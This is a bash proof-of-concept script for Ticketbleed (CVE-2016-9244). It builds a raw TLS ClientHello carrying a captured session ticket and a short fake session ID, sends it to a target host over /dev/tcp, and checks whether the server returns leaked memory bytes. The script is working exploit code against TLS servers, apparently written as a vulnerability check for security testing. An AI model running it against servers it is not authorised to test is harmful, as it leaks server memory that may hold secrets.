#!/bin/bash

# Fast and reliable POC bash socket implementation of ticketbleed (CVE-2016-9244), see also http://ticketbleed.com/
# Author: Dirk Wetter, GPLv2 see https://testssl.sh/LICENSE.txt
#
# sockets inspired by http://blog.chris007.de/?p=238
# ticketbleed inspired by https://blog.filippo.io/finding-ticketbleed/
#
###### DON'T DO EVIL! USAGE AT YOUR OWN RISK. DON'T VIOLATE LAWS! #######

[[ -z "$1" ]] && echo "IP is missing" && exit 1

readonly PS4='${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'

OPENSSL=${OPENSSL:-$(type -p openssl)}
TIMEOUT=${TIMEOUT:-20}

# insert some hexspeak here :-)
SID="x00,x00,x0B,xAD,xC0,xDE,"               # don't forget the trailing comma

NODE="$1"
PORT="${NODE#*:}"
PORT="${PORT-443}"                           # probably this doesn't make sense
NODE="${NODE%:*}"                            # strip port if supplied
TLSV=${2:-01}                                # TLS 1.0=x01  1.1=0x02, 1.2=0x3
MAXSLEEP=$TIMEOUT
SOCKREPLY=""
COL_WIDTH=32
DEBUG=${DEBUG:-"false"}
HELLO_READBYTES=${HELLO_READBYTES:-65535}

dec2hex() { printf "x%02x" "$1"; }
dec2hexB() {
     a=$(printf "%04x" "$1")
     printf "x%02s, x%02s" "${a:0:2}" "${a:2:2}"
}

LEN_SID=$(( ${#SID} / 4))                         # the real length in bytes
XLEN_SID="$(dec2hex $LEN_SID)"

red=$(tput setaf 1; tput bold)
green=$(tput bold; tput setaf 2)
lgreen=$(tput setaf 2)
brown=$(tput setaf 3)
blue=$(tput setaf 4)
magenta=$(tput setaf 5)
cyan=$(tput setaf 6)
grey=$(tput setaf 7)
yellow=$(tput setaf 3; tput bold)
normal=$(tput sgr0)

send_clienthello() {
     local -i len_ch=216                          # len of clienthello, excluding TLS session ticket and SID (record layer)
     local session_tckt_tls="$1"
     local -i len_tckt_tls="${#1}"
     local xlen_tckt_tls=""

     len_tckt_tls=$(( len_tckt_tls / 4))
     xlen_tckt_tls="$(dec2hex $len_tckt_tls)"

     local len_handshake_record_layer="$(( LEN_SID + len_ch + len_tckt_tls ))"
     local xlen_handshake_record_layer="$(dec2hexB "$len_handshake_record_layer")"
     local len_handshake_ssl_layer="$(( len_handshake_record_layer + 4 ))"
     local xlen_handshake_ssl_layer="$(dec2hexB "$len_handshake_ssl_layer")"

     if $DEBUG; then
          echo "len_tckt_tls (hex):            $len_tckt_tls ($xlen_tckt_tls)"
          echo "SID:                           $SID"
          echo "LEN_SID (XLEN_SID)             $LEN_SID ($XLEN_SID)"
          echo "len_handshake_record_layer:    $len_handshake_record_layer ($xlen_handshake_record_layer)"
          echo "len_handshake_ssl_layer:       $len_handshake_ssl_layer ($xlen_handshake_ssl_layer)"
          echo "session_tckt_tls:              $session_tckt_tls"
     fi

     client_hello="
# TLS header (5 bytes)
     ,x16,               # Content type (x16 for handshake)
     x03, x01,           # TLS Version
                         # Length Secure Socket Layer follow:
     $xlen_handshake_ssl_layer,
# Handshake header
     x01,                # Type (x01 for ClientHello)
                         # Length of client hello follows:
     x00, $xlen_handshake_record_layer,
     x03, x$TLSV,        # TLS Version
# Random (32 byte) Unix time etc, see www.moserware.com/2009/06/first-few-milliseconds-of-https.html
     xee, xee, x5b, x90, x9d, x9b, x72, x0b,
     xbc, x0c, xbc, x2b, x92, xa8, x48, x97,
     xcf, xbd, x39, x04, xcc, x16, x0a, x85,
     x03, x90, x9f, x77, x04, x33, xff, xff,
     $XLEN_SID,          # Session ID length
     $SID
     x00, x66,             # Cipher suites length
# Cipher suites (51 suites)
     xc0, x14, xc0, x0a, xc0, x22, xc0, x21,
     x00, x39, x00, x38, x00, x88, x00, x87,
     xc0, x0f, xc0, x05, x00, x35, x00, x84,
     xc0, x12, xc0, x08, xc0, x1c, xc0, x1b,
     x00, x16, x00, x13, xc0, x0d, xc0, x03,
     x00, x0a, xc0, x13, xc0, x09, xc0, x1f,
     xc0, x1e, x00, x33, x00, x32, x00, x9a,
     x00, x99, x00, x45, x00, x44, xc0, x0e,
     xc0, x04, x00, x2f, x00, x96, x00, x41,
     xc0, x11, xc0, x07, xc0, x0c, xc0, x02,
     x00, x05, x00, x04, x00, x15, x00, x12,
     x00, x09, x00, x14, x00, x11, x00, x08,
     x00, x06, x00, x03, x00, xff,
     x01,               # Compression methods length
     x00,               # Compression method (x00 for NULL)
     x01, x0b,          # Extensions length
# Extension: ec_point_formats
     x00, x0b, x00, x04, x03, x00, x01, x02,
# Extension: elliptic_curves
     x00, x0a, x00, x34, x00, x32, x00, x0e,
     x00, x0d, x00, x19, x00, x0b, x00, x0c,
     x00, x18, x00, x09, x00, x0a, x00, x16,
     x00, x17, x00, x08, x00, x06, x00, x07,
     x00, x14, x00, x15, x00, x04, x00, x05,
     x00, x12, x00, x13, x00, x01, x00, x02,
     x00, x03, x00, x0f, x00, x10, x00, x11,
# Extension: SessionTicket TLS
     x00, x23,
# length of SessionTicket TLS
     x00, $xlen_tckt_tls,
# Session Ticket
     $session_tckt_tls                       # here we have the comma already
# Extension: Heartbeat
     x00, x0f, x00, x01, x01"

     msg=$(echo "$client_hello" | sed -e 's/# .*$//g' -e 's/ //g' | sed -E 's/^[[:space:]]+//; s/[[:space:]]+$//; /^$/d' | sed 's/,/\\/g' | tr -d '\n')
     socksend "$msg" $TLSV
}


parse_hn_port() {
     # strip "https", supposed it was supplied additionally
     grep -q 'https://' <<< "$NODE" && NODE="$(sed -e 's/https\:\/\///' <<< "$NODE")"

     # strip trailing urlpath
     NODE=$(sed -e 's/\/.*$//' <<< "$NODE")

     # determine port, supposed it was supplied additionally
     grep -q ':' <<< "$NODE" && PORT=$(sed 's/^.*\://' <<< "$NODE") && NODE=$(sed 's/\:.*$//' <<< "$NODE")
}

wait_kill(){
     pid=$1
     maxsleep=$2
     while true; do
          if ! ps $pid >/dev/null ; then
               return 0  # didn't reach maxsleep yet
          fi
          sleep 1
          maxsleep=$((maxsleep - 1))
          test $maxsleep -eq 0 && break
     done                # needs to be killed
     kill $pid >&2 2>/dev/null
     wait $pid 2>/dev/null
     return 3            # killed
}


socksend() {
     local len

     data="$(echo -n $1)"
     if "$DEBUG"; then
          echo "\"$data\""
          len=$(( $(wc -c <<< "$data") / 4 ))
          echo -n "length: $len / "
          dec2hexB $len
          echo
     fi
     echo -en "$data" >&5
}


sockread_nonblocking() {
     [[ "x$2" == "x" ]] && maxsleep=$MAXSLEEP || maxsleep=$2
     ret=0

     SOCKREPLY="$(dd bs=$1 count=1 <&5 2>/dev/null | hexdump -v -e '16/1 "%02X"')" &
     wait_kill $! $maxsleep
     ret=$?
     echo -n -e "$SOCKREPLY"       # this doesn't work as the SOCKREPLY above belngs to a bckgnd process
     return $ret
}

sockread() {
     dd bs=$1 count=1 <&5 2>/dev/null | hexdump -v -e '16/1 "%02X"'
}

fixme(){
     tput bold; tput setaf 5; echo -e "\n$1\n"; tput sgr0
}


fd_socket(){
     if ! exec 5<> /dev/tcp/$NODE/$PORT; then
          echo "$(basename $0): unable to connect to $NODE:$PORT"
          exit 2
     fi
}

close_socket(){
     exec 5<&-
     exec 5>&-
     return 0
}

cleanup() {
     close_socket
     echo
     echo
     return 0
}


get_sessticket() {
     local sessticket_str
     local output

     output="$($OPENSSL s_client -connect $NODE:$PORT </dev/null 2>/dev/null)"
     if ! grep -qw CONNECTED <<< "$output"; then
        return 1
     else
        sessticket_str="$(awk '/TLS session ticket:/,/^$/' <<< "$output" | awk '!/TLS session ticket/')"
        sessticket_str="$(sed -e 's/^.* - /x/g' -e 's/  .*$//g' <<< "$sessticket_str" | tr '\n' ',')"
        sed -e 's/ /,x/g' -e 's/-/,x/g' <<< "$sessticket_str"
        return 0
    fi
}

#### main

parse_hn_port "$1"

early_exit=true
declare -a memory sid_detected
nr_sid_detected=0


# there are different "timeout". Check whether --preserve-status is supported
if type -p timeout &>/dev/null ; then
        if timeout --help 2>/dev/null | grep -q 'preserve-status'; then
            OPENSSL="timeout --preserve-status $TIMEOUT $OPENSSL"
        else
            OPENSSL="timeout $TIMEOUT $OPENSSL"
        fi
else
        echo " binary \"timeout\" not found. Continuing without it"
        unset TIMEOUT
fi


echo
"$DEBUG" && ( echo )
echo "##### 1) Connect to determine 1x session ticket TLS"
# attn! neither here nor in the following client hello we do SNI. Assuming this is a vulnebilty of the TLS implementation
SESS_TICKET_TLS="$(get_sessticket)"
if [[ $? -ne 0 ]]; then
        echo >&2
        echo -e "$NODE:$PORT ${magenta}not reachable / no TLS${normal}\n " >&2
        exit 0
fi
[[ "$SESS_TICKET_TLS" == "," ]] && echo -e "${green}OK, not vulnerable${normal}, no session tickets\n" && exit 0

trap "cleanup" QUIT EXIT
"$DEBUG" && ( echo; echo )
echo "##### 2) Sending 1 to 3 ClientHello(s) (TLS version 03,$TLSV) with this ticket and a made up SessionID"

# we do 3 client hellos, and see whether different memory is returned
for i in 1 2 3; do
     fd_socket $PORT

     "$DEBUG" && echo "$i"
     send_clienthello "$SESS_TICKET_TLS"

     "$DEBUG" && ( echo; echo )
     [[ "$i" -eq 1 ]] && echo "##### Reading server replies ($HELLO_READBYTES bytes)" && echo
     SOCKREPLY=$(sockread $HELLO_READBYTES)

     if "$DEBUG"; then
          echo "============================="
          echo "$SOCKREPLY"
          echo "============================="
     fi

     if [[ "${SOCKREPLY:0:2}" == "15" ]]; then
          echo -n "TLS Alert ${SOCKREPLY:10:4} (TLS version: ${SOCKREPLY:2:4}) -- "
          echo "${green}OK, not vulnerable ${normal} (TLS alert)"
          break
     elif [[ -z "${SOCKREPLY:0:2}" ]]; then
          echo "${green}OK, not vulnerable ${normal} (zero reply)"
          break
     elif [[ "${SOCKREPLY:0:2}" == "16" ]]; then
          # we need to look into this as some servers just respond as if nothing happened
          early_exit=false
          "$DEBUG" && echo -n "Handshake (TLS version: ${SOCKREPLY:2:4}), "
          if [[ "${SOCKREPLY:10:6}" == 020000 ]]; then
               echo -n "      ServerHello $i -- "
          else
               echo -n "      Message type: ${SOCKREPLY:10:6} -- "
          fi
          sid_input=$(sed -e 's/x//g' -e 's/,//g' <<< "$SID")
          sid_detected[i]="${SOCKREPLY:88:32}"
          memory[i]="${SOCKREPLY:$((88+ len_sid*2)):$((32 - len_sid*2))}"
          if "$DEBUG"; then
               echo
               echo "TLS version, record layer: ${SOCKREPLY:18:4}"
               #echo "Random bytes / timestamp:  ${SOCKREPLY:22:64}"
               echo "memory:                    ${memory[i]}"
               echo "Session ID:                ${sid_detected[i]}"
          fi
          if grep -q $sid_input <<< "${sid_detected[i]}"; then
               #echo -n "  (${yellow}Session ID${normal}, ${red}mem returned${normal} --> "
               echo -n "${sid_detected[i]}" | sed -e "s/$sid_input/${grey}$sid_input${normal}${blue}/g"
               echo "${normal})"
          else
               echo -n "not expected server reply but likely not vulnerable"
          fi
     else
          echo "TLS record ${SOCKREPLY:0:2} replied"
          echo -n "Strange server reply, pls report"
          break
     fi
done
echo

if ! "$early_exit"; then
     # here we test the replies if a TLS server hello was received >1x
     for i in 1 2 3 ; do
          if grep -q $sid_input <<< "${sid_detected[i]}"; then
               # was our faked TLS SID returned?
               nr_sid_detected=$((nr_sid_detected + 1))
          fi
     done
     if [[ $nr_sid_detected -eq 3 ]]; then
          if [[ ${memory[1]} != ${memory[2]} ]] && [[ ${memory[2]} != ${memory[3]} ]]; then
               echo "${red}VULNERABLE!${normal}, real memory returned"
          else
               echo "${green}not vulnerable ${normal} (same memory fragments returned)"
          fi
     else
          echo "results ($nr_sid_detected of 3) are kind of fishy. If it persist, let Dirk know"
     fi
fi

exit 0

#  vim:ts=5:sw=5

